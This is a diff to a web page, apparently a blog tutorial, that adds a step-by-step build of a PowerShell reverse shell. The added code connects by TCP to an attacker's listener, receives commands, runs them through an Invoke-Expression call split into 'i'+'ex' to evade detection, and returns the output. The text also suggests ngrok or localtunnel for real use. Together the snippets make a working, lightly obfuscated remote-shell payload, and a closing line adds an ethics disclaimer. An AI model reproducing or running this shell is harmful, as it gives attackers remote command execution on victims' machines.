@@ -134,12 +134,79 @@
       </h4>
 
       <h1>Step 1: Specifying IP and port variables </h1>
-      <h4>We will assign the attacking IP and port variables as usual</h4>
+      <h4>We will assign the attacking IP and port variables as usual, for testing purposes i have specified
+        my local machine's details, for actual testing scenarious, we can use port forwarding using services like 
+        ngrok or localtunnel, this depends on your choice in the end.
+      </h4>
       <pre><code>
         $ip='192.168.78.1'  # Change this to your listener IP
         $p=9201 #Change this to your Listener Port
-      </code></pre>      
-      
+      </code></pre>  
+      <h4>Alright, Now lets move on to the next step, where we will setup connection with this IP.</h4>
+      <h1>Step 2: TCP connection to the Attacker's Server</h1>
+      <h4>We will use powershell to generate a TCP client to the IP, this is done through the following.</h4>
+      <pre><code>
+        $t=New-Object Net.Sockets.TCPClient($ip,$p)
+        $s=$t.GetStream()
+      </code></pre>    
+      <h1>Step 3: Setting up ASCII Encoding for Data Transmission</h1>
+<h4>We will set up ASCII encoding for data transmission. This encoding will be used to convert data into byte arrays that can be sent over the network stream.</h4>
+<pre><code>
+  $e=[Text.Encoding]::ASCII
+</code></pre>
+
+<h4>Now, with the encoding set up, we will initialize the byte array that will be used to hold the data received from the attacker’s server.</h4>
+<pre><code>
+  [Byte[]]$b=0..65535|%{0}  # Create an empty byte array to receive data
+</code></pre>
+
+<h1>Step 4: Reading Data from the Attacker’s Server</h1>
+<h4>In this step, we will continuously read data from the network stream. The data received will be executed as commands on the victim's system.</h4>
+<pre><code>
+  while(($l=$s.Read($b,0,$b.Length))-ne 0){
+      $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$l)  # Convert the byte array to a string
+</code></pre>
+
+<h4>The command received is stored in the `$d` variable, which will then be executed by the next step.</h4>
+
+<h1>Step 5: Executing the Received Command</h1>
+<h4>Now that we have the command in string form, we will execute it using PowerShell's `Invoke-Expression` (`iex`). This allows us to run any code that is passed over the network.</h4>
+<pre><code>
+  $r=(&('i'+'ex') ". { $d } 2>&1" | Out-String)  # Execute the received command using Invoke-Expression
+</code></pre>
+
+<h4>In this line, we concatenate 'i' and 'ex' to form the `iex` command, which is responsible for executing the string stored in `$d`.</h4>
+
+<h1>Step 6: Formatting the Output</h1>
+<h4>Once the command is executed, we need to format the output before sending it back to the attacker. We will append the PowerShell prompt (the current working directory) to the result of the executed command.</h4>
+<pre><code>
+  $r2=$r+("PS "+(pwd).Path+"> ")  # Append the current directory to the output
+</code></pre>
+
+<h4>This output will now contain both the results of the executed command and the PowerShell prompt, making it appear as though it is a normal PowerShell session.</h4>
+
+<h1>Step 7: Sending the Output Back to the Attacker</h1>
+<h4>After formatting the output, we need to convert it into bytes and send it back to the attacker’s machine through the TCP connection.</h4>
+<pre><code>
+  $sb=$e.GetBytes($r2)  # Convert the formatted output to bytes
+  $s.Write($sb,0,$sb.Length)  # Send the output to the attacker’s server
+  $s.Flush()  # Ensure the data is sent immediately
+</code></pre>
+
+<h4>At this point, the attacker will receive the output of the executed command in the form of a byte array, which is then displayed on their terminal or command interface.</h4>
+
+<h1>Step 8: Closing the Connection</h1>
+<h4>Once the reverse shell session is finished, we should close the connection to clean up the resources and end the communication with the attacker’s server.</h4>
+<pre><code>
+  $t.Close()  # Close the TCP connection
+</code></pre>
+
+<h4>This gracefully terminates the session by closing the TCP client object that we created earlier.</h4>
+
+<h1>Conclusion</h1>
+<h4>At this point, we have successfully created a reverse shell in PowerShell that allows the attacker to execute commands on the victim’s machine and receive the results back. This technique is commonly used in penetration testing, but it can also be used by attackers for malicious purposes if exploited improperly.</h4>
+<h4>Be sure to use these techniques responsibly and only in ethical testing environments where you have permission to do so.</h4>
+
     
     <div class="nested-copy-line-height lh-copy serif f4 nested-links mid-gray pr4-l w-two-thirds-l"><ul class="pa0">
   
